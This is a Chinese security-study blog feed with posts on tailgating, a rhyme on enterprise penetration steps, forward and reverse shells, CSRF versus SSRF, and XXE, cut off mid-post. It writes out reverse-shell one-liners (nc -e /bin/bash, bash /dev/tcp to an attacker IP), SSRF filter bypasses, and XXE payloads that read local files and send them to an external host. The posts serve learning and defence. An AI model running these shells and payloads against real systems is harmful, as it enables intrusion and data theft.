    <url>/2022/10/23/%E4%BB%80%E4%B9%88%E6%98%AF%E5%B0%BE%E9%9A%8F%E6%94%BB%E5%87%BB%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BF%9D%E6%8A%A4%E8%87%AA%E5%B7%B1%E5%85%8D%E5%8F%97%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>无论您是花时间上网还是在办公室工作，您都希望知道自己处于安全的环境中，让您高枕无忧。虽然我们大多数人都知道在上网时要采取预防措施――保护自己免受网络钓鱼攻击和其他网络威胁的侵害，但我们也应该注意自己的人身安全。</p><span id="more"></span><p>一个问题是尾随――一种社会工程攻击，其中有人可以物理访问企业以获取机密信息或造成其他伤害。</p><h2 id="什么是尾随攻击"><a href="#什么是尾随攻击" class="headerlink" title="什么是尾随攻击?"></a>什么是尾随攻击?</h2><p>尾随是一种社会工程攻击，未经授权的人可以物理访问禁区（可能是密码保护区域)，在那里他们可能会窃取敏感信息、损坏财产、破坏用户凭据，甚至<strong>在计算机上安装恶意软件</strong>。</p><p>“捎带”与尾随密切相关，但它涉及受骗员工的同意。因此，虽然工作人员可能不知道有人将他们尾随其后进入禁区，但黑客可能会说服工作人员提供访问权限，因为他们冒充送货司机。</p><h2 id="谁有尾随攻击的危险"><a href="#谁有尾随攻击的危险" class="headerlink" title="谁有尾随攻击的危险?"></a>谁有尾随攻击的危险?</h2><p>尤其有可能称为尾随诈骗目标的公司包括:</p><ul><li>有许多员工，经常进出场所</li><li>具有多个进入建筑物的入口点</li><li>定期接收食物、包裹、文件和其他物品的交付</li><li>有许多分包商为他们工作</li><li>员工没有在物理和网络安全协议方面接受过全面培训</li></ul><p>一般来说，拥有强大安全系统(包括使用生物识别、徽章或其他身份和信息安全措施)的公司可以更好地防止尾随和捎带攻击。</p><p>但这并不是说某些口齿伶俐的欺诈者无法说服某人让他们进入或找到绕过这些保护措施的方法。</p><h2 id="常见的追尾方法有哪些"><a href="#常见的追尾方法有哪些" class="headerlink" title="常见的追尾方法有哪些?"></a>常见的追尾方法有哪些?</h2><p>您在工作中应该注意的常见尾随攻击类型包括:</p><ul><li>有人走到你身后进入安全区域，这取决于你的常见礼貌，为他们保持门打开</li><li>他们看起来不像快递员或送货司机</li><li>他们看起来不像快递员或送货司机</li><li>有人拿着满满一手的东西来欺骗你为他们开门</li><li>声称他们丢失了工作ID或将其忘在家里的人，以便您准许他们进入</li></ul><h2 id="如何保护自己免受未遂攻击"><a href="#如何保护自己免受未遂攻击" class="headerlink" title="如何保护自己免受未遂攻击"></a>如何保护自己免受未遂攻击</h2><p>保护自己免受尾随攻击的部分原因在于了解该问题，提高您对工作的认识水平，并取决于您的雇主，建立更有效的安全系统。</p><p>一些解决方案包括:</p><h3 id="加强安全培训"><a href="#加强安全培训" class="headerlink" title="加强安全培训"></a>加强安全培训</h3><p>许多公司知道如何培训员工识别、避免和应对在线安全问题，但可能忘记对物理安全进行同样的努力。如何发现和处理威胁应该是培训的一部分，同时培养对周围环境和可能不合适的人的意识。<br>管理层应向每个人提供明确说明的安全政策，该政策可能会坚持在没有适当通行证或身份证明的情况下不允许任何人进入安全区域。随着安全策略的更新，所有员工都应了解更改和添加内容。</p><h3 id="智能徽章和卡片"><a href="#智能徽章和卡片" class="headerlink" title="智能徽章和卡片"></a>智能徽章和卡片</h3><p>如果您的大型企业分布在多个楼层，员工可能很难知道谁在那里工作，谁不在那里工作，从而使他们容易受到尾随和捎带攻击。要求智能徽章和卡进入受限区域有助于减少未经授权的入侵并提供更好的访问控制。<br>建立配备专门安保人员的配备齐全的接待区也可以成为更大安保系统的一部分。</p><h3 id="生物识别扫描仪"><a href="#生物识别扫描仪" class="headerlink" title="生物识别扫描仪"></a>生物识别扫描仪</h3><p>生物识别扫描仪是一种更先进的方法，可以为工人的身份提供适当的身份验证。他们扫描一个人的独特身体或听觉特征，并将其与经批准人员的数据库进行比较。</p><p>生物特征安全的例子包括:</p><ul><li>语音识别</li><li>虹膜识别</li><li>指纹扫描</li><li>面部识别</li><li>心率传感器</li></ul><h3 id="了解社会工程学"><a href="#了解社会工程学" class="headerlink" title="了解社会工程学"></a>了解社会工程学</h3><p>人们容易受到物理和网络攻击的一个原因是他们缺乏社会工程及其构成的威胁类型的教育。</p><p>工人需要了解全方位的社会工程技术和专业知识来保护自己，无论是在他们的社交媒体账户还是在实际工作环境中。</p><p>就他们而言，公司可以使用模拟网络钓鱼电子邮件和尾随攻击来提高意识并强调如何遵循协议来处理它们。</p><h3 id="视频监控"><a href="#视频监控" class="headerlink" title="视频监控"></a>视频监控</h3><p>如果进入企业的方式有很多，那么在所有入口设置视频监控可能是有意义的。先进的视频监控系统可以使用人工智能(AI)和视频分析来扫描进入人员的面部，并将其与员工特征数据库进行比较。</p>]]></content>
    
    
    
    <tags>
      
      <tag>零零散散</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>企业网络的常见渗透思路</title>
    <link href="/2022/10/20/%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E5%B8%B8%E8%A7%81%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/"/>
    <url>/2022/10/20/%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E5%B8%B8%E8%A7%81%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<p>看到的一段话,觉得很有意思,转载一下。</p><span id="more"></span><p>搞企业，先扫描；<br>扫描器，商业好； &#x2F;&#x2F; 商业版扫描器通常比较强大<br>默认密，都知道； &#x2F;&#x2F; 很多系统存在默认账号默认口令<br>社工库，找一找；<br>邮箱号，先列好； &#x2F;&#x2F; 搜集企业员工个人邮箱<br>九头蛇，跑一跑； &#x2F;&#x2F; Hydra 是一个密码破解工具<br>搞不定，放大招；<br>发邮件，凭伪造； &#x2F;&#x2F; 发钓鱼邮件，比如冒充管理员让用户到指定页面去输入密码<br>没邮箱，搞网站；<br>二级域，皆可爆； &#x2F;&#x2F; 主域的防护通常较好，某些较弱的二级域可作为突破点<br>老漏洞，没修好； &#x2F;&#x2F; 有些老漏洞可能没有被恰当地修复，工作失误也可能让漏洞回归<br>新漏洞，刷一票； &#x2F;&#x2F; 大部分企业对漏洞能做到一周内修复就算三好学生了<br>干研发，Git  找； &#x2F;&#x2F; 常有人把为公司写的代码也传到github上，里面可能会包含口令等<br>源代码，全都要； &#x2F;&#x2F; 即使源码不包含口令，也很有助于发现漏洞<br>CDN ，  可以跳；<br>防火墙，可以撬；<br>堡垒机，可以绕；<br>云防护，可以秒； &#x2F;&#x2F; 各种防护措施都不是有了就行，需要正确地使用<br>是企业，没有哪家搞不了！</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透思路</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>正向shell和反向shell</title>
    <link href="/2022/10/19/%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell/"/>
    <url>/2022/10/19/%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell/</url>
    
    <content type="html"><![CDATA[<p>假如ubuntu、CentOS为目标服务器系统</p><p>kali为攻击者的系统，ip为：192.168.0.4，开放7777端口且没被占用</p><p>最终是将ubuntu、CentOS的shell反弹到kali上</p><h3 id="正向反弹shell"><a href="#正向反弹shell" class="headerlink" title="正向反弹shell"></a>正向反弹shell</h3><h5 id="目标机-ubuntu或者CentOS-上面输入"><a href="#目标机-ubuntu或者CentOS-上面输入" class="headerlink" title="目标机(ubuntu或者CentOS)上面输入"></a>目标机(ubuntu或者CentOS)上面输入</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc -lvp 端口号 -e <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><h5 id="攻击机上输入"><a href="#攻击机上输入" class="headerlink" title="攻击机上输入"></a>攻击机上输入</h5><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nc</span> <span class="hljs-built_in">ip</span> 端口号<br></code></pre></td></tr></table></figure><p>正向反弹是目标机先执行nc命令，然后攻击机上再进行nc监听，即可反弹shell。</p><p>需要目标机安装nc。</p><h3 id="反向反弹shell"><a href="#反向反弹shell" class="headerlink" title="反向反弹shell"></a>反向反弹shell</h3><p>方法1：bash反弹</p><h5 id="被控制端-bash-i-gt-amp-x2F-dev-x2F-tcp-x2F-攻击机的ip-x2F-port-0-gt-amp-1"><a href="#被控制端-bash-i-gt-amp-x2F-dev-x2F-tcp-x2F-攻击机的ip-x2F-port-0-gt-amp-1" class="headerlink" title="被控制端:bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机的ip&#x2F;port 0&gt;&amp;1"></a>被控制端:bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机的ip&#x2F;port 0&gt;&amp;1</h5><p><img src="/../images/%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell/image-20221019201817575.png" alt="a"></p><h5 id="但首先需要在攻击机上使用nc监听端口：nc-lvp-端口号"><a href="#但首先需要在攻击机上使用nc监听端口：nc-lvp-端口号" class="headerlink" title="但首先需要在攻击机上使用nc监听端口：nc -lvp 端口号"></a>但首先需要在攻击机上使用nc监听端口：nc -lvp 端口号</h5><p><img src="/../images/%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell/image-20221019201951687.png" alt="b"></p><p>此时就可以获得shell</p><p><img src="/../images/%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell/image-20221019202129236.png" alt="c"></p><p>此方法在ubuntu下不会反弹成功，CentOS可以反弹成功</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>​无论是正向shell还是反弹shell，都是A控制B，只是请求端不一样，一个是主动控制，一个被动控制，与<a href="https://so.csdn.net/so/search?q=%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86&spm=1001.2101.3001.7020">正向代理</a>和反向代理一样。<br>​反弹shell就会更加的稳定，用途更大。</p>]]></content>
    
    
    
    <tags>
      
      <tag>反弹shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简述CSRF和SSRF的区别</title>
    <link href="/2022/10/16/%E7%AE%80%E8%BF%B0CSRF%E5%92%8CSSRF%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2022/10/16/%E7%AE%80%E8%BF%B0CSRF%E5%92%8CSSRF%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<p>目前正在了解Web漏洞，正巧在各类面试题中都看到这样一道面试题：</p><p>“请简述CSRF、SSRF与会话重放的区别”</p><p>因为最近正好了解到CSRF和SSRF，会话重放还不太熟悉，所以将会话重放暂且不提，在以下总结CSRF和SSRF的概念与区别。</p><span id="more"></span><h2 id="CSRF："><a href="#CSRF：" class="headerlink" title="CSRF："></a>CSRF：</h2><p>CSRF，本名为Cross-site requestforgery，也就是跨站请求伪造。</p><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">跨站请求伪造(英语<span class="hljs-symbol">:Cross-site</span> request forgery) ，也被称为one-click attack或者session riding，通常缩写为<span class="hljs-title class_">CSRF</span>或者<span class="hljs-title class_">XSRF</span><br>是一种挟持用户在当前已登录的web应用程序上执行非本意的操作的攻击方法。<br>例如<span class="hljs-symbol">:</span>攻击者盗用了你在某个网站的身份,以你的名义发送恶意请求。<br></code></pre></td></tr></table></figure><h4 id="与XSS不得不说的关系"><a href="#与XSS不得不说的关系" class="headerlink" title="与XSS不得不说的关系"></a>与XSS不得不说的关系</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">说到CSRF，不得不提一下XSS。CSRF看起来好像和XSS跨站脚本攻击有着“不得不说的秘密”，实则却是两个不同维度的情况。从名字上来看，同为跨站攻击，XSS攻击是跨站脚本攻击，CSRF攻击是请求伪造，也就是CSRF攻击本不是出自用户之手，却经过第三方恶意攻击者的处理，伪装成了受信任用户的“亲历亲为”。<br>XSS是实现CSRF的诸多途径中的一条，但并不是唯一的一条。<br></code></pre></td></tr></table></figure><h4 id="CSRF能做的事"><a href="#CSRF能做的事" class="headerlink" title="CSRF能做的事"></a>CSRF能做的事</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">以你的名义：<br>发邮件<br>发消息<br>财产操作比如转账或者购买商品<br>新建文件<br>增删改查的操作也可以做等等<br></code></pre></td></tr></table></figure><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>CSRF利用前提</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1.登录信任网站，并在浏览器中保存相应的cookie<br>2.在不退出登录的情况下，访问恶意网站<br></code></pre></td></tr></table></figure><h4 id="分类与利用-GET-CSRF-和-POST-CSRF"><a href="#分类与利用-GET-CSRF-和-POST-CSRF" class="headerlink" title="分类与利用    GET CSRF 和 POST CSRF"></a>分类与利用    GET CSRF 和 POST CSRF</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">对于很多网站来说，即使是一些重要的操作使用<span class="hljs-keyword">POST</span>来提交请求，但是服务器再接收请求的时候并没有严格区分<span class="hljs-keyword">POST</span>和GET。在PHP中滥用<span class="hljs-variable">$_REQUEST</span>就是例子。<br>如果服务端已经区分了GET,<span class="hljs-keyword">POST</span>只用<span class="hljs-keyword">POST</span>请求数据，可以通过制造一个隐藏的表单，并通过js代码自动提交伪造的表单。<br></code></pre></td></tr></table></figure><h4 id="CSRF漏洞挖掘"><a href="#CSRF漏洞挖掘" class="headerlink" title="CSRF漏洞挖掘"></a>CSRF漏洞挖掘</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>）冒充身份:订阅<span class="hljs-regexp">/关注/</span>转发/投票操作，删除文件，更改配置等<br><span class="hljs-number">2</span>）帐户接管:密码修改，邮箱绑定，第三方帐户关联<br><span class="hljs-number">3</span>）其他:登录<span class="hljs-regexp">/注册/</span>注销/注册<br><span class="hljs-number">4</span>）安全设计原则:CSRF登录后令牌未更新、登出后未注销等<br></code></pre></td></tr></table></figure><h4 id="CSRF漏洞防御"><a href="#CSRF漏洞防御" class="headerlink" title="CSRF漏洞防御"></a>CSRF漏洞防御</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">从漏洞原理来看：<br><span class="hljs-number">1</span>.关键操作增加验证码机制(比如说支付密码)(增加带有大量噪点的验证码，杜绝代码能够识别的简单验证码，当然了也经常被绕过)<br><span class="hljs-number">2</span>.验证<span class="hljs-built_in">referer</span>(采用同源策略,referer记录着数据包的来源地址,来判断请求的合法性,但是这个可以伪造)<br><span class="hljs-number">3</span>.使用<span class="hljs-built_in">Token</span>(每次访问都会改变)(令牌是一种将表单value的加密算法生成不同的加密结果,在服务器端进行验证)<br><br>从漏洞利用前提条件来看：<br>用户需要养成访问完一个网站之后，点击退出帐户的好习惯<br>（如果用户换浏览器登录则无法继续CSRF漏洞, 因为cookie只存在登录的那个浏览器）<br></code></pre></td></tr></table></figure><h2 id="SSRF："><a href="#SSRF：" class="headerlink" title="SSRF："></a>SSRF：</h2><p>SSRF,也就是Server Side RequestForgery—服务器端请求伪造。</p><h4 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">从字面上来看，与CSRF不同的是，它是服务器端发出的请求伪造而非从用户一端提交。别误会，作为受信任用户，服务器当然不可能做出损害用户信息的事。它是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。因为它是由服务端发起的，所以它能够请求到与它相连但与外网隔离的内部系统。由于服务端提供了从其他服务器应用获取数据的功能（例如分享等功能)且没有对目标地址做过滤与限制，给予了攻击者乘虚而入的机会。比如从指定<span class="hljs-built_in">URL</span>地址获取网页文本内容、加载指定地址的图片、下载等等。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。<br></code></pre></td></tr></table></figure><h4 id="SSRF能做的事情"><a href="#SSRF能做的事情" class="headerlink" title="SSRF能做的事情"></a>SSRF能做的事情</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">可以对外网服务器所在的内网、本地进行端口扫描，获取一些服务的banner信息。<br>攻击运行在内网或者本地的应用程序。<br>对内网web应用进行指纹识别，通过访问默认文件实现。<br>攻击内外网的web应用。sql注入、struct2、redis等。<br>利用<span class="hljs-built_in">file</span>协议读取本地文件等。<br></code></pre></td></tr></table></figure><h4 id="SSRF常见限制"><a href="#SSRF常见限制" class="headerlink" title="SSRF常见限制"></a>SSRF常见限制</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">1.</span>限制为http:<span class="hljs-comment">//www.xxx.com域名</span><br>采用http基本身份认证的方式绕过。即@<br>http:<span class="hljs-comment">//www.xXX.com@www.XXC.com</span><br><span class="hljs-number">2.</span>限制请求IP不为内网地址<br>当不允许ip为内网地址时<span class="hljs-comment">(1)</span>采取短网址绕过<span class="hljs-comment">(2)</span>采取特殊域名<span class="hljs-comment">(3)</span>采取进制转换<br><span class="hljs-number">3.</span>限制请求只为http协议<span class="hljs-comment">(1)</span>采取<span class="hljs-number">302</span>跳转   <span class="hljs-comment">(2)</span>采取短地址<br></code></pre></td></tr></table></figure><h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式:"></a>绕过方式:</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">限制前缀@  <br>限制IP地址句号  <br>限制网址www<span class="hljs-selector-class">.localhost</span>.com/使用 短链接(<span class="hljs-built_in">curl</span>(暂不能用)  file_get_contents)    <br>特殊网址绕过sslip.io和nip<span class="hljs-selector-class">.io</span>    <br>IP的进制转换十进制十六进制<br></code></pre></td></tr></table></figure><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-number">1</span>.过滤返回信息，如果web应用数去获取某一类型文件，在把结果返回给用户之前先验证信息是否符合标准。<br>例如:当攻击者利用<span class="hljs-string">&quot;识别图片&quot;</span>下的该漏洞远程包含一个文件，可以通过在服务器上验证返回数据是否是纯像素，来进行过滤。<br><span class="hljs-number">2</span>.统一错误页<br><span class="hljs-number">3</span>.限制请求端口为http常用端口<span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">8090</span><br><span class="hljs-number">4</span>.内网<span class="hljs-built_in">IP</span>黑名单，避免应用被用来获取内网数据，攻击内网<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，CSRF是服务器端没有对用户提交的数据进行严格的把控，导致攻击者可以利用用户的Cookie信息伪造用户请求发送至服务器。而SSRF是服务器对用户提供的可控URL地址过于信任，没有经过严格检测，导致攻击者可以以此为跳板攻击内网或其他服务器。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CSRF</tag>
      
      <tag>SSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE</title>
    <link href="/2022/10/13/XXE/"/>
    <url>/2022/10/13/XXE/</url>
    
    <content type="html"><![CDATA[<h4 id="XXE是什么"><a href="#XXE是什么" class="headerlink" title="XXE是什么"></a>XXE是什么</h4><p>是做数据传输。</p><span id="more"></span><p>xxe是<strong>xml外部实体注入</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">简单来说，XXE(<span class="hljs-type">XML</span> <span class="hljs-keyword">External</span> Entity Injection)就是<span class="hljs-type">XML</span>外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。<br>例如，如果你当前使用的程序为PHP，则可以将libxml_disable_entity_loader设置为<span class="hljs-keyword">TRUE</span>来禁用外部实体，从而起到防御的目的。<br>XXE漏洞触发的点往往是可以上传<span class="hljs-type">XML</span>文件的位置，没有对上传的<span class="hljs-type">XML</span>文件进行过滤，导致可以上传恶意的<span class="hljs-type">XML</span>文件。<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">XML被设计用来传输和存储数据<br><span class="hljs-selector-tag">html</span>被设计用来显示数据<br></code></pre></td></tr></table></figure><h5 id="XML基本格式与基本语法"><a href="#XML基本格式与基本语法" class="headerlink" title="XML基本格式与基本语法"></a>XML基本格式与基本语法</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">所有XML元素都必须有关闭标签<br>XML标签对大小写敏感<br>XML必须正确地嵌套<br>XML文档必须有根元素<br>XML的属性值需加引号<br>可以将多个字符放入&lt;![CDATA[内容]]&gt;进行转义<br></code></pre></td></tr></table></figure><h5 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h5><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-built_in">XML</span>文档有自己的一个格式规范，这个格式规范是由一个叫做DTD(document <span class="hljs-keyword">type</span> definition)的东西控制的。<br>DTD用来为<span class="hljs-built_in">XML</span>文档定义语义约束。可以嵌入在<span class="hljs-built_in">XML</span>文档中(内部声明),也可以独立的放在另外一个单独的文件中(外部引用)。是<span class="hljs-built_in">XML</span>文档中的几条语句,用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。<br><br>内部声明:<br><span class="hljs-meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span>  例: <span class="hljs-meta">&lt;!DOCTYOE <span class="hljs-keyword">test</span> <span class="hljs-keyword">any</span>&gt;</span><br><br>外部声明:<br> <span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;文件名&quot;</span>&gt;</span> 例:<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;http://www.test.com/evil.dtd&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="XML预定义五个实体引用"><a href="#XML预定义五个实体引用" class="headerlink" title="XML预定义五个实体引用"></a>XML预定义五个实体引用</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;lt;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;amp;</span><span class="hljs-symbol">&amp;apos;</span><span class="hljs-symbol">&amp;quot;</span><br>&lt;&gt;&amp;&#x27;&quot;<br></code></pre></td></tr></table></figure><h5 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h5><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">字符实体<br>命名实体<br>外部实体<br>参数实体<br>内部实体<br>普通实体和参数实体都分为内部实体和外部实体两种，外部实体定义需要加上<span class="hljs-keyword">SYSTEM</span>关键字，其内容是URL所指向的外部文件实际的内容。如果不加<span class="hljs-keyword">SYSTEM</span>关键字，则为内部实体，表示实体指代内容为字符串。<br></code></pre></td></tr></table></figure><h5 id="XML外部实体示例"><a href="#XML外部实体示例" class="headerlink" title="XML外部实体示例"></a>XML外部实体示例</h5><h5 id="无回显时使用"><a href="#无回显时使用" class="headerlink" title="无回显时使用"></a>无回显时使用</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">BP抓包后,修改成POST模式,在后面加上<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/phpStudy/1.txt&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml">文件一:</span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span></span></span><br><span class="hljs-meta"><span class="language-xml">        <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://10.0.0.19/?%file;&#x27;&gt;&quot;</span></span></span><br><span class="hljs-meta"><span class="language-xml">        &gt;</span></span><br><span class="language-xml"></span><span class="language-perl">        %all;</span><span class="language-xml"></span><br><span class="language-xml">        </span><br><span class="language-xml">文件二</span><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span></span><br><span class="hljs-meta"><span class="language-xml"> <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/Windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"> <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://www.localhost.com/xxe_file.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%dtd;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%send;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br></code></pre></td></tr></table></figure><p>BP中直接显示明文</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span 